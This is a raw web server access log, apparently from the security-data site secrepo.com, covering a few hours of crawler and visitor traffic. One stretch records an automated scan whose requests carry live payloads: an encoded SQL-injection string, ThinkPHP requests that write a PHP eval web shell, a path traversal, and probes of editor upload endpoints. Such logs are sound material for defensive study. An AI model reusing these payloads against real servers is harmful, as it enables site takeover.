216.244.66.245 - - [08/Jun/2023:01:58:14 -0700] "GET /self.logs/error.log.2023-04-16.gz HTTP/1.1" 200 1082 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
193.42.40.154 - - [08/Jun/2023:04:02:14 -0700] "GET /user.php?act=login HTTP/1.1" 404 305 "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:569:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a32747364586c715a7935776148416e4c4363385033426f6343426a6247467a63794248595530784d475a424e53423749484231596d78705979426d6457356a64476c766269426658324e76626e4e30636e566a6443676b5344647464545970657942415a585a68624367694c797061527a5636613235535a6c4e724b6938694c6952494e3231314e69346949696b3749483139626d563349456468545445775a6b45314b435266556b565256555654564673784d6a4e644b54732f506963702729293b2f2f7d787878,10-- -\";s:2:\"id\";s:11:\"-1' UNION/*\";}554fcae493e564ee0dc75bdf2ebf94ca" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.29 Safari/525.13" 
193.42.40.154 - - [08/Jun/2023:04:02:14 -0700] "POST /kluyjg.php HTTP/1.1" 404 305 "http://www.secrepo.com/kluyjg.php" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
193.42.40.154 - - [08/Jun/2023:04:02:14 -0700] "GET /fckeditor/editor/filemanager/connectors/php/connector.php HTTP/1.1" 404 305 "http://www.secrepo.com/fckeditor/editor/filemanager/connectors/php/connector.php" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 3.5.30729)" 
193.42.40.154 - - [08/Jun/2023:04:02:15 -0700] "GET /user.php?act=login HTTP/1.1" 404 305 "45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:\"num\";s:569:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a32747364586c715a7935776148416e4c4363385033426f6343426a6247467a63794248595530784d475a424e53423749484231596d78705979426d6457356a64476c766269426658324e76626e4e30636e566a6443676b5344647464545970657942415a585a68624367694c797061527a5636613235535a6c4e724b6938694c6952494e3231314e69346949696b3749483139626d563349456468545445775a6b45314b435266556b565256555654564673784d6a4e644b54732f506963702729293b2f2f7d787878,10-- -\";s:2:\"id\";s:11:\"-1' UNION/*\";}45ea207d7a2b68c49582d2d22adf953a" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00" 
193.42.40.154 - - [08/Jun/2023:04:02:15 -0700] "POST /kluyjg.php HTTP/1.1" 404 305 "http://www.secrepo.com/kluyjg.php" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; ja-jp) AppleWebKit/531.22.7 (KHTML, like Gecko) Version/4.0.5 Safari/531.22.7" 
193.42.40.154 - - [08/Jun/2023:04:02:15 -0700] "GET /e/aspx/upload.aspx?a=pageadmin_cms HTTP/1.1" 404 305 "http://www.secrepo.com/e/aspx/upload.aspx?a=pageadmin_cms" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.4 Safari/532.0" 
193.42.40.154 - - [08/Jun/2023:04:02:15 -0700] "GET /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 404 305 "http://www.secrepo.com/index.php?m=member&c=index&a=register&siteid=1" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16" 
193.42.40.154 - - [08/Jun/2023:04:02:16 -0700] "GET /?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=nahwl.php&vars%5B1%5D%5B%5D=%3C?php%20class%20GaM10fA5%20%7B%20public%20function%20__construct($H7mu6)%7B%20@eval(%22/*ZG5zknRfSk*/%22.$H7mu6.%22%22);%20%7D%7Dnew%20GaM10fA5($_REQUEST%5B'xise'%5D);?%3Edjsjxbei37$ HTTP/1.1" 418 746 "http://www.secrepo.com/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=nahwl.php&vars[1][]=<?php class GaM10fA5 { public function __construct($H7mu6){ @eval(\"/*ZG5zknRfSk*/\".$H7mu6.\"\"); }}new GaM10fA5($_REQUEST['xise']);?>djsjxbei37$" "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.0.4) Firefox/3.0.8)" 
193.42.40.154 - - [08/Jun/2023:04:02:16 -0700] "GET /nahwl.php HTTP/1.1" 404 305 "http://www.secrepo.com/nahwl.php" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b8pre) Gecko/20101114 Firefox/4.0b8pre" 
193.42.40.154 - - [08/Jun/2023:04:02:16 -0700] "GET /index.php/Home/Uploadify/preview HTTP/1.1" 404 305 "http://www.secrepo.com/index.php/Home/Uploadify/preview" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19" 
193.42.40.154 - - [08/Jun/2023:04:02:16 -0700] "GET /index.php?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write?cacheFile=ygp.php&content=%3C?php%20class%20GaM10fA5%20%7B%20public%20function%20__construct($H7mu6)%7B%20@eval(%22/*ZG5zknRfSk*/%22.$H7mu6.%22%22);%20%7D%7Dnew%20GaM10fA5($_REQUEST%5B'123'%5D);?%3EjwB9GE HTTP/1.1" 418 746 "http://www.secrepo.com/index.php?s=index/\\think\\template\\driver\\file/write?cacheFile=ygp.php&content=<?php class GaM10fA5 { public function __construct($H7mu6){ @eval(\"/*ZG5zknRfSk*/\".$H7mu6.\"\"); }}new GaM10fA5($_REQUEST['123']);?>jwB9GE" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.209.0 Safari/532.0" 
193.42.40.154 - - [08/Jun/2023:04:02:17 -0700] "GET /SiteServer/Ajax/ajaxOtherService.aspx HTTP/1.1" 404 305 "http://www.secrepo.com/SiteServer/Ajax/ajaxOtherService.aspx" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.2.9) Gecko/20100824 Firefox/3.6.9 ( .NET CLR 3.5.30729; .NET CLR 4.0.20506)" 
193.42.40.154 - - [08/Jun/2023:04:02:17 -0700] "GET /index.php HTTP/1.1" 404 305 "http://www.secrepo.com/index.php" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b7) Gecko/20100101 Firefox/4.0b7" 
193.42.40.154 - - [08/Jun/2023:04:02:17 -0700] "GET /search.asp HTTP/1.1" 404 305 "http://www.secrepo.com/search.asp" "Mozilla/5.0 (MSIE 7.0; Macintosh; U; SunOS; X11; gu; SV1; InfoPath.2; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)" 
193.42.40.154 - - [08/Jun/2023:04:02:18 -0700] "POST /e/DoInfo/ecms.php HTTP/1.1" 404 305 "http://www.secrepo.com/e/DoInfo/ecms.php" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13" 
193.42.40.154 - - [08/Jun/2023:04:02:18 -0700] "GET /seeyon/thirdpartyController.do.css/..;/ajax.do HTTP/1.1" 404 305 "http://www.secrepo.com/seeyon/thirdpartyController.do.css/..;/ajax.do" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; InfoPath.1)" 
193.42.40.154 - - [08/Jun/2023:04:02:18 -0700] "GET /ueditor/net/controller.ashx?action=catchimage HTTP/1.1" 404 305 "http://www.secrepo.com/ueditor/net/controller.ashx?action=catchimage" "Mozilla/5.0 (Windows; U; Windows NT 5.2; eu) AppleWebKit/530.4 (KHTML, like Gecko) Chrome/2.0.172.0 Safari/530.4" 
193.42.40.154 - - [08/Jun/2023:04:02:19 -0700] "GET /js/ueditor/net/controller.ashx?action=catchimage HTTP/1.1" 404 305 "http://www.secrepo.com/js/ueditor/net/controller.ashx?action=catchimage" "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.6 Safari/532.2" 
193.42.40.154 - - [08/Jun/2023:04:02:19 -0700] "GET /static/ueditor/net/controller.ashx?action=catchimage HTTP/1.1" 404 305 "http://www.secrepo.com/static/ueditor/net/controller.ashx?action=catchimage" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.357.0 Safari/533.3" 
193.42.40.154 - - [08/Jun/2023:04:02:19 -0700] "GET /Scripts/Ueditor/net/controller.ashx?action=catchimage HTTP/1.1" 404 305 "http://www.secrepo.com/Scripts/Ueditor/net/controller.ashx?action=catchimage" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.212.0 Safari/532.0" 
193.42.40.154 - - [08/Jun/2023:04:02:20 -0700] "GET /Utility/UEditor?action=catchimage HTTP/1.1" 404 305 "http://www.secrepo.com/Utility/UEditor?action=catchimage" "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.0.4) Firefox/3.0.8)" 
193.42.40.154 - - [08/Jun/2023:04:02:20 -0700] "GET /Utility/UEditor/net?action=catchimage HTTP/1.1" 404 305 "http://www.secrepo.com/Utility/UEditor/net?action=catchimage" "Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.24" 
193.42.40.154 - - [08/Jun/2023:04:02:21 -0700] "GET /Content/scripts/plugins/ueditor/net/controller.ashx?action=catchimage HTTP/1.1" 404 305 "http://www.secrepo.com/Content/scripts/plugins/ueditor/net/controller.ashx?action=catchimage" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060821 Firefox/2.0b2" 
193.42.40.154 - - [08/Jun/2023:04:02:21 -0700] "GET /static/admin/js/plugins/ueditor/net/controller.ashx?action=catchimage HTTP/1.1" 404 305 "http://www.secrepo.com/static/admin/js/plugins/ueditor/net/controller.ashx?action=catchimage" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.2 (KHTML, like Gecko) Chrome/3.0.191.3 Safari/531.2" 
193.42.40.154 - - [08/Jun/2023:04:02:21 -0700] "GET /ueditor_kejin/net/controller.ashx?action=catchimage HTTP/1.1" 404 305 "http://www.secrepo.com/ueditor_kejin/net/controller.ashx?action=catchimage" "Mozilla/4.0 (compatible; MSIE 6.0; Mac_PowerPC; en) Opera 9.24" 
193.42.40.154 - - [08/Jun/2023:04:02:22 -0700] "GET /content/ueditor/net/controller.ashx?action=catchimage HTTP/1.1" 404 305 "http://www.secrepo.com/content/ueditor/net/controller.ashx?action=catchimage" "Mozilla/5.0 (Windows; U; Windows NT 5.1; ru-RU) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16" 
193.42.40.154 - - [08/Jun/2023:04:02:22 -0700] "POST /index.php/api/Uploadify/preview HTTP/1.1" 404 305 "http://www.secrepo.com/index.php/api/Uploadify/preview" "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)" 
193.42.40.154 - - [08/Jun/2023:04:02:23 -0700] "GET /wxapp.php HTTP/1.1" 404 305 "http://www.secrepo.com/wxapp.php" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.9.0.16) Gecko/2009120208 Firefox/3.0.16 FBSMTWB" 
193.42.40.154 - - [08/Jun/2023:04:02:23 -0700] "POST /wxapp.php?controller=Goods.doPageUpload HTTP/1.1" 404 305 "http://www.secrepo.com/wxapp.php?controller=Goods.doPageUpload" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13(KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13" 
193.42.40.154 - - [08/Jun/2023:04:02:23 -0700] "POST /utility/convert/index.php?a=config&source=d7.2_x2.0 HTTP/1.1" 418 746 "http://www.secrepo.com/utility/convert/index.php?a=config&source=d7.2_x2.0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2 ( .NET CLR 3.0.04506.30)" 
193.42.40.154 - - [08/Jun/2023:04:02:24 -0700] "POST /utility/convert/data/config.inc.php HTTP/1.1" 404 305 "http://www.secrepo.com/utility/convert/data/config.inc.php" "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.213.0 Safari/532.1" 
193.42.40.154 - - [08/Jun/2023:04:02:25 -0700] "POST /tt.php HTTP/1.1" 404 305 "http://www.secrepo.com/tt.php" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19" 
193.42.40.154 - - [08/Jun/2023:04:02:25 -0700] "GET /?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=wxsqw.php&content=%3C?php%20class%20GaM10fA5%20%7B%20public%20function%20__construct($H7mu6)%7B%20@eval(%22/*ZG5zknRfSk*/%22.$H7mu6.%22%22);%20%7D%7Dnew%20GaM10fA5($_REQUEST%5B'pass'%5D);?%3E HTTP/1.1" 418 746 "http://www.secrepo.com/?s=index/\\think\\template\\driver\\file/write&cacheFile=wxsqw.php&content=<?php class GaM10fA5 { public function __construct($H7mu6){ @eval(\"/*ZG5zknRfSk*/\".$H7mu6.\"\"); }}new GaM10fA5($_REQUEST['pass']);?>" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b8pre) Gecko/20101213 Firefox/4.0b8pre" 
193.42.40.154 - - [08/Jun/2023:04:02:25 -0700] "POST /wxsqw.php HTTP/1.1" 404 305 "http://www.secrepo.com/wxsqw.php" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/532.0" 
193.42.40.154 - - [08/Jun/2023:04:02:26 -0700] "POST /index.php?s=/home/page/uploadImg HTTP/1.1" 404 269 "http://www.secrepo.com/index.php?s=/home/page/uploadImg" "Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13" 
193.42.40.154 - - [08/Jun/2023:04:02:27 -0700] "POST /mobile/api/api.ali.php HTTP/1.1" 404 328 "http://www.secrepo.com/mobile/api/api.ali.php" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 (.NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)" 
193.42.40.154 - - [08/Jun/2023:04:02:27 -0700] "GET /inc/package/work.php?id=../../../../../myoa/attach/approve_center/2210/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E.wer HTTP/1.1" 418 746 "http://www.secrepo.com/inc/package/work.php?id=../../../../../myoa/attach/approve_center/2210/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E.wer" "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.30 Safari/525.13" 
193.42.40.154 - - [08/Jun/2023:04:02:27 -0700] "POST /fckeditor/editor/filemanager/upload/aspx/upload.aspx?Type=Media HTTP/1.1" 404 305 "http://www.secrepo.com/fckeditor/editor/filemanager/upload/aspx/upload.aspx?Type=Media" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.6pre) Gecko/2008121605 Firefox/3.0.6pre" 
51.222.253.8 - - [08/Jun/2023:04:03:49 -0700] "GET /sitemap.xml HTTP/1.1" 301 441 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
94.46.23.20 - - [08/Jun/2023:04:10:01 -0700] "GET / HTTP/1.1" 200 13185 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)" 
94.46.23.20 - - [08/Jun/2023:04:10:02 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 328 "-" "Safari%E6%B5%8F%E8%A7%88%E5%99%A8/16615.2.9.11.6 CFNetwork/1240.0.4.3 Darwin/20.6.0" 
94.46.23.20 - - [08/Jun/2023:04:10:03 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 328 "-" "Safari%E6%B5%8F%E8%A7%88%E5%99%A8/16615.2.9.11.6 CFNetwork/1240.0.4.3 Darwin/20.6.0" 
94.46.23.20 - - [08/Jun/2023:04:10:03 -0700] "GET / HTTP/1.1" 200 13185 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1" 
94.46.23.20 - - [08/Jun/2023:04:10:04 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 328 "-" "Safari%E6%B5%8F%E8%A7%88%E5%99%A8/16615.2.9.11.6 CFNetwork/1240.0.4.3 Darwin/20.6.0" 
94.46.23.20 - - [08/Jun/2023:04:10:05 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 328 "-" "Safari%E6%B5%8F%E8%A7%88%E5%99%A8/16615.2.9.11.6 CFNetwork/1240.0.4.3 Darwin/20.6.0" 
194.28.5.80 - - [08/Jun/2023:04:16:43 -0700] "GET / HTTP/1.1" 200 13185 "-" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/114.0.5735.99 Mobile/15E148 Safari/604.1" 
194.28.5.80 - - [08/Jun/2023:04:16:43 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/114.0.5735.99 Mobile/15E148 Safari/604.1" 
194.28.5.80 - - [08/Jun/2023:04:16:43 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7533 "http://www.secrepo.com/" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/114.0.5735.99 Mobile/15E148 Safari/604.1" 
194.28.5.80 - - [08/Jun/2023:04:16:43 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27916 "http://www.secrepo.com/" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/114.0.5735.99 Mobile/15E148 Safari/604.1" 
194.28.5.80 - - [08/Jun/2023:04:16:43 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 713 "-" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/114.0.5735.99 Mobile/15E148 Safari/604.1" 
103.44.34.202 - - [08/Jun/2023:04:33:11 -0700] "GET / HTTP/1.1" 200 13185 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15" 
103.44.34.202 - - [08/Jun/2023:04:33:11 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27893 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15" 
103.44.34.202 - - [08/Jun/2023:04:33:11 -0700] "GET /css/style.css HTTP/1.1" 404 328 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15" 
103.44.34.202 - - [08/Jun/2023:04:33:11 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7533 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15" 
103.44.34.202 - - [08/Jun/2023:04:33:14 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 713 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15" 
73.64.105.8 - - [08/Jun/2023:04:38:02 -0700] "GET / HTTP/1.1" 200 13185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" 
73.64.105.8 - - [08/Jun/2023:04:38:02 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" 
73.64.105.8 - - [08/Jun/2023:04:38:02 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27893 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" 
73.64.105.8 - - [08/Jun/2023:04:38:02 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7556 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" 
73.64.105.8 - - [08/Jun/2023:04:38:03 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 690 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" 
122.10.45.213 - - [08/Jun/2023:04:49:09 -0700] "GET / HTTP/1.1" 200 13186 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4280.67 Safari/537.36 Edg/97.0.664.52" 
45.12.253.198 - - [08/Jun/2023:04:56:57 -0700] "GET /wp-content/themes/wpclassic/inc/index.php HTTP/1.1" 429 486 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" 
27.115.124.40 - - [08/Jun/2023:04:58:48 -0700] "GET / HTTP/1.1" 200 13186 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1" 
27.115.124.40 - - [08/Jun/2023:04:58:48 -0700] "GET /css/style.css HTTP/1.1" 404 305 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1" 
216.244.66.245 - - [08/Jun/2023:05:10:04 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
51.222.253.3 - - [08/Jun/2023:05:15:56 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
216.244.66.245 - - [08/Jun/2023:05:31:06 -0700] "GET /self.logs/error.log.2023-05-25.gz HTTP/1.1" 200 2514 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
14.116.152.103 - - [08/Jun/2023:05:35:38 -0700] "GET / HTTP/1.1" 200 13149 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" 
223.198.137.233 - - [08/Jun/2023:05:45:08 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 713 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.37" 
118.209.26.179 - - [08/Jun/2023:05:49:05 -0700] "GET / HTTP/1.1" 200 13185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36" 
118.209.26.179 - - [08/Jun/2023:05:49:05 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36" 
118.209.26.179 - - [08/Jun/2023:05:49:12 -0700] "GET / HTTP/1.1" 200 13185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36" 
118.209.26.179 - - [08/Jun/2023:05:49:12 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36" 
113.103.7.72 - - [08/Jun/2023:06:21:54 -0700] "GET / HTTP/1.1" 200 13186 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1" 
113.103.7.72 - - [08/Jun/2023:06:21:55 -0700] "GET /css/style.css HTTP/1.1" 404 328 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1" 
157.51.60.147 - - [08/Jun/2023:06:23:11 -0700] "GET / HTTP/1.1" 200 13186 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/114.0  Mobile/15E148 Safari/605.1.15" 
157.51.60.147 - - [08/Jun/2023:06:23:12 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27893 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/114.0  Mobile/15E148 Safari/605.1.15" 
157.51.60.147 - - [08/Jun/2023:06:23:12 -0700] "GET /css/style.css HTTP/1.1" 404 328 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/114.0  Mobile/15E148 Safari/605.1.15" 
